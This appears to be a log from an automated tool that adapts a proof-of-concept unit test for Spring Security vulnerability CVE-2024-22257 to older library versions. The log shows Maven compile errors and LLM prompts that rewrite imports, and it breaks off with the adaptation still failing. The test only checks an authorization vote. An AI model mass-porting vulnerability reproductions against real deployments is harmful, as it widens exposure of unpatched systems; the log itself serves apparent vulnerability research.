[1m[Main] === Starting adaptation process for CVE-2024-22257 ===[0m
[96m[Processor] Fetching all available Maven versions...[0m
[96m[Analyzer] Loading cached versions from: /PoCAdaptation/library/org_springframework_security_spring-security-core.txt[0m
[96m[Analyzer] org.springframework.security:spring-security-core has 248 versions (cached).[0m
[96m[Processor] Identifying versions with successful reproduction...[0m
[96m[Processor] Pending versions: ['2.0.0', '2.0.1', '2.0.2', '2.0.3', '2.0.4', '2.0.5.RELEASE', '2.0.6.RELEASE', '2.0.7.RELEASE', '2.0.8.RELEASE'][0m
[96m[Preparer] Pending directory already exists: /PoCAdaptation/exploit/pending/CVE-2024-22257[0m
[92m[Main] Total affected versions: 210[0m
[92m[Main] Already reproduced versions: 201[0m
[93m[Main] Versions pending adaptation: 9[0m
[96m[Main]     -> ['2.0.0', '2.0.1', '2.0.2', '2.0.3', '2.0.4', '2.0.5.RELEASE', '2.0.6.RELEASE', '2.0.7.RELEASE', '2.0.8.RELEASE'][0m
[96m[Main]     -> ['3.0.0.RELEASE', '3.0.1.RELEASE', '3.0.2.RELEASE', '3.0.3.RELEASE', '3.0.4.RELEASE', '3.0.5.RELEASE', '3.0.6.RELEASE', '3.0.7.RELEASE', '3.0.8.RELEASE', '3.1.0.RELEASE', '3.1.1.RELEASE', '3.1.2.RELEASE', '3.1.3.RELEASE', '3.1.4.RELEASE', '3.1.5.RELEASE', '3.1.6.RELEASE', '3.1.7.RELEASE', '3.2.0.RELEASE', '3.2.1.RELEASE', '3.2.2.RELEASE', '3.2.3.RELEASE', '3.2.4.RELEASE', '3.2.5.RELEASE', '3.2.6.RELEASE', '3.2.7.RELEASE', '3.2.8.RELEASE', '3.2.9.RELEASE', '3.2.10.RELEASE', '4.0.0.RELEASE', '4.0.1.RELEASE', '4.0.2.RELEASE', '4.0.3.RELEASE', '4.0.4.RELEASE', '4.1.0.RELEASE', '4.1.1.RELEASE', '4.1.2.RELEASE', '4.1.3.RELEASE', '4.1.4.RELEASE', '4.1.5.RELEASE', '4.2.0.RELEASE', '4.2.1.RELEASE', '4.2.2.RELEASE', '4.2.3.RELEASE', '4.2.4.RELEASE', '4.2.5.RELEASE', '4.2.6.RELEASE', '4.2.7.RELEASE', '4.2.8.RELEASE', '4.2.9.RELEASE', '4.2.10.RELEASE', '4.2.11.RELEASE', '4.2.12.RELEASE', '4.2.13.RELEASE', '4.2.14.RELEASE', '4.2.15.RELEASE', '4.2.16.RELEASE', '4.2.17.RELEASE', '4.2.18.RELEASE', '4.2.19.RELEASE', '4.2.20.RELEASE', '5.0.0.RELEASE', '5.0.1.RELEASE', '5.0.2.RELEASE', '5.0.3.RELEASE', '5.0.4.RELEASE', '5.0.5.RELEASE', '5.0.6.RELEASE', '5.0.7.RELEASE', '5.0.8.RELEASE', '5.0.9.RELEASE', '5.0.10.RELEASE', '5.0.11.RELEASE', '5.0.12.RELEASE', '5.0.13.RELEASE', '5.0.14.RELEASE', '5.0.15.RELEASE', '5.0.16.RELEASE', '5.0.17.RELEASE', '5.0.18.RELEASE', '5.0.19.RELEASE', '5.1.0.RELEASE', '5.1.1.RELEASE', '5.1.2.RELEASE', '5.1.3.RELEASE', '5.1.4.RELEASE', '5.1.5.RELEASE', '5.1.6.RELEASE', '5.1.7.RELEASE', '5.1.8.RELEASE', '5.1.9.RELEASE', '5.1.10.RELEASE', '5.1.11.RELEASE', '5.1.12.RELEASE', '5.1.13.RELEASE', '5.2.0.RELEASE', '5.2.1.RELEASE', '5.2.2.RELEASE', '5.2.3.RELEASE', '5.2.4.RELEASE', '5.2.5.RELEASE', '5.2.6.RELEASE', '5.2.7.RELEASE', '5.2.8.RELEASE', '5.2.9.RELEASE', '5.2.10.RELEASE', '5.2.11.RELEASE', '5.2.12.RELEASE', '5.2.13.RELEASE', '5.2.14.RELEASE', '5.2.15.RELEASE', '5.3.0.RELEASE', '5.3.1.RELEASE', '5.3.2.RELEASE', '5.3.3.RELEASE', '5.3.4.RELEASE', '5.3.5.RELEASE', '5.3.6.RELEASE', '5.3.7.RELEASE', '5.3.8.RELEASE', '5.3.9.RELEASE', '5.3.10.RELEASE', '5.3.11.RELEASE', '5.3.12.RELEASE', '5.3.13.RELEASE', '5.4.0', '5.4.1', '5.4.2', '5.4.3', '5.4.4', '5.4.5', '5.4.6', '5.4.7', '5.4.8', '5.4.9', '5.4.10', '5.4.11', '5.5.0', '5.5.1', '5.5.2', '5.5.3', '5.5.4', '5.5.5', '5.5.6', '5.5.7', '5.5.8', '5.6.0', '5.6.1', '5.6.2', '5.6.3', '5.6.4', '5.6.5', '5.6.6', '5.6.7', '5.6.8', '5.6.9', '5.6.10', '5.6.11', '5.6.12', '5.7.0', '5.7.1', '5.7.2', '5.7.3', '5.7.4', '5.7.5', '5.7.6', '5.7.7', '5.7.8', '5.7.9', '5.7.10', '5.7.11', '5.8.0', '5.8.1', '5.8.2', '5.8.3', '5.8.4', '5.8.5', '5.8.6', '5.8.7', '5.8.8', '5.8.9', '5.8.10', '6.0.0', '6.0.1', '6.0.2', '6.0.3', '6.0.4', '6.0.5', '6.0.6', '6.0.7', '6.0.8', '6.1.0', '6.1.1', '6.1.2', '6.1.3', '6.1.4', '6.1.5', '6.1.6', '6.1.7', '6.2.0', '6.2.1', '6.2.2'][0m
[96m[Executor] Running initial exploit mvn test in /PoCAdaptation/exploit/origin/CVE-2024-22257/exploit[0m
[91m[Executor] Initial exploit execution finished with return code 1[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.ComparisonFailure'[0m
[92m[Verifier] âœ“ Detail matched: '<[]1>'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Verifier] Initial exploit behavior verified successfully.[0m
[96m[Selector] Nearest need adapatation version selected: 2.0.8.RELEASE[0m
[96m[Selector] Closest reproduced version: 3.0.0.RELEASE at index 9[0m
[96m[Adapter] Trying next closest version: 2.0.8.RELEASE[0m
[96m[Preparer] Using exploit from origin: /PoCAdaptation/exploit/origin/CVE-2024-22257/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.8.RELEASE/exploit[0m
[96m[Preparer] Updating dependency version to 2.0.8.RELEASE in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.8.RELEASE/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 2.0.8.RELEASE in /PoCAdaptation/exploit/pending/CVE-2024-22257/2.0.8.RELEASE/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 2.0.8.RELEASE...[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Attempting adaptation from base version 3.0.0.RELEASE to 2.0.8.RELEASE...[0m
[96m[Adapter] Start adapting exploit from 3.0.0.RELEASE to 2.0.8.RELEASE"[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[7,43] package org.springframework.security.access does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[8,43] package org.springframework.security.access does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,43] package org.springframework.security.access does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Authentication[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,14] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class ConfigAttribute[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthenticatedVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,37] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable SecurityConfig[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[25,39] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AccessDecisionVoter[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class AnonymousAuthenticationToken[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable AuthorityUtils[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 3551 (prompt), 1 (completion), 3552 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully with version 3.0.0.RELEASE.

Your task is to:
1. Analyze why this issue occurs with the *3.0.0.RELEASE* but not with the *2.0.8.RELEASE version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2024-22257 >--------------------
[INFO] Building CVE-2024-22257 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2024-22257 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2024-22257 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2024-22257 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2024-22257 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[7,43] package org.springframework.security.access does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[8,43] package org.springframework.security.access does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,43] package org.springframework.security.access does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol
  symbol:   class Authentication
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol
  symbol:   class AuthenticatedVoter
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol
  symbol:   class AuthenticatedVoter
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,14] cannot find symbol
  symbol:   class ConfigAttribute
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol
  symbol:   variable AuthenticatedVoter
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,37] cannot find symbol
  symbol:   variable SecurityConfig
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[25,39] cannot find symbol
  symbol:   variable AccessDecisionVoter
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol
  symbol:   class AnonymousAuthenticationToken
  location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol
  symbol:   variable AuthorityUtils
  location: class edu.vision.se.Testcase1
[INFO] 16 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.255 s
[INFO] Finished at: 2025-07-10T06:44:54Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[7,43] package org.springframework.security.access does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[8,43] package org.springframework.security.access does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,43] package org.springframework.security.access does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[10,48] package org.springframework.security.access.vote does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[11,51] package org.springframework.security.authentication does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[12,41] package org.springframework.security.core does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[13,51] package org.springframework.security.core.authority does not exist
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[28,12] cannot find symbol
[ERROR]   symbol:   class Authentication
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,9] cannot find symbol
[ERROR]   symbol:   class AuthenticatedVoter
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,40] cannot find symbol
[ERROR]   symbol:   class AuthenticatedVoter
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,14] cannot find symbol
[ERROR]   symbol:   class ConfigAttribute
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,63] cannot find symbol
[ERROR]   symbol:   variable AuthenticatedVoter
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,37] cannot find symbol
[ERROR]   symbol:   variable SecurityConfig
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[25,39] cannot find symbol
[ERROR]   symbol:   variable AccessDecisionVoter
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,20] cannot find symbol
[ERROR]   symbol:   class AnonymousAuthenticationToken
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[29,71] cannot find symbol
[ERROR]   symbol:   variable AuthorityUtils
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>edu.vision.se</groupId>
    <artifactId>CVE-2024-22257</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>

    <dependencies>
        
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-core</artifactId>
            <version>2.0.8.RELEASE</version>
        </dependency>

        
        <dependency>
            <groupId>org.assertj</groupId>
            <artifactId>assertj-core</artifactId>
            <version>3.24.0</version>
        </dependency>
    <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
    
    </dependencies>

</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 140 (prompt), 9 (completion), 149 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 2.0.8.RELEASE: 

Error: package org.springframework.security.access does not exist, None, None 

The test executes as expected in 3.0.0.RELEASE 

Error code: import org.springframework.security.access.AccessDecisionVoter; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
org.springframework.security.access;AccessDecisionVoter
[96m[ErrorManager] Extracted key entities: ['org.springframework.security.access', 'AccessDecisionVoter'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 7, 'column': 43, 'message': 'package org.springframework.security.access does not exist', 'symbol': None, 'location': None, 'code_line': 'import org.springframework.security.access.AccessDecisionVoter;'} with cause: ['org.springframework.security.access', 'AccessDecisionVoter'][0m
[96m[Adapter] Related diffs for error: [(444, 14.0), (445, 8.0), (446, 8.0), (555, 8.0), (561, 8.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: package org.springframework.security.access does not exist | cause: ['org.springframework.security.access', 'AccessDecisionVoter'][0m
[96m[RepairModule] Trying best diff #444 with score 14.00[0m
[LLMClient] Tokens used: 570 (prompt), 260 (completion), 830 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 2.0.8.RELEASE:org.springframework.security:spring-security-core.
This test file compiles and runs successfully in 3.0.0.RELEASE.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 3.0.0.RELEASE to 2.0.8.RELEASE.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: package org.springframework.security.access does not exist, symble: None, location: None

### Error Position:
import org.springframework.security.access.AccessDecisionVoter;

### Related Diff:
Operation: MODIFIED, File: core/src/main/java/org/springframework/security/access/AccessDecisionVoter.java, Hunk: @@ -13,11 +13,11 @@
  * limitations under the License.
  */

+package org.springframework.security.vote;
-package org.springframework.security.access;

+import org.springframework.security.Authentication;
+import org.springframework.security.ConfigAttribute;
+import org.springframework.security.ConfigAttributeDefinition;
-import java.util.Collection;
-
-import org.springframework.security.core.Authentication;


 /**

### Test File Content:
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.access.AccessDecisionVoter;
import org.springframework.security.access.ConfigAttribute;
import org.springframework.security.access.SecurityConfig;
import org.springframework.security.access.vote.AuthenticatedVoter;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.authority.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.createAuthorityList("ignored"));
    }
}


[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import org.junit.Test;
import org.springframework.security.vote.AccessDecisionVoter;
import org.springframework.security.access.ConfigAttribute;
import org.springframework.security.access.SecurityConfig;
import org.springframework.security.access.vote.AuthenticatedVoter;
import org.springframework.security.authentication.AnonymousAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.authority.AuthorityUtils;

public class Testcase1 {

    @Test
    public void testAnonymousWorks() {
        AuthenticatedVoter voter = new AuthenticatedVoter();
        List<ConfigAttribute> def = SecurityConfig.createList(AuthenticatedVoter.IS_AUTHENTICATED_ANONYMOUSLY);
        validateReturnValue(voter.vote(null, null, def));
    }

    public void validateReturnValue(int result) {
         assertThat(result).isEqualTo(AccessDecisionVoter.ACCESS_DENIED);
    }

    public Authentication createAnonymous() {
        return new AnonymousAuthenticationToken("ignored", "ignored", AuthorityUtils.createAuthorityList("ignored"));
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2024-22257 on version 2.0.8.RELEASE...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.ComparisonFailure'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2024-22257: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[8,43] package org.springframework.security.access does not exist[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2024-22257/2.0.8.RELEASE/exploit/src/test/java/edu/vision/se/Testcase1.java:[9,43] package org.springframework.security.access does not exist[0m
